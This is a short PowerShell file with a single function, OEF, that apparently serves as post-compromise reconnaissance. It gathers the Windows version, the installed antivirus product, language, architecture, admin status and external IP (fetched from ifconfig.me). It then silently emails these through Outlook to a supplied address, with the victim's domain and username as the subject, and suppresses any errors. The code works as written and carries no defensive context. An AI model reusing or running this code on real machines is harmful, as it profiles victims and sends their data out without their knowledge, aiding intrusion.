function OEF {

	Param (
		[Parameter(Mandatory=$true)]
		[string] $To
	)

	try {
		$Outlook = New-Object -ComObject Outlook.Application
		$Win_Ver = (Get-WmiObject -class Win32_OperatingSystem).Caption
		$av = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct).displayName
		$lang = (Get-WinUserLanguageList)[0].LanguageTag
		$arch =  (Get-CimInstance CIM_OperatingSystem).OSArchitecture
		$externalIp = (Invoke-WebRequest -uri  "http://ifconfig.me/ip" -UseBasicParsing).Content 
		$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
		$msg_body = "OS:		$Win_Ver<br />AV:		$av<br />LANG: 		$lang<br />ARCH:		$arch<br />ADMIN:		$isAdmin<br />EXT IP: 	$externalIp<br />"
		$Mail = $Outlook.CreateItem(0)
		$Mail.To = $To
		$Mail.Subject = "" + $env:userdomain + "\" + $env:username
		$Mail.HTMLBody = "" + $msg_body
		$Mail.Send()
		Start-Sleep -m 100
		$Outlook.Quit
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
	
	}
	catch { }
	
}
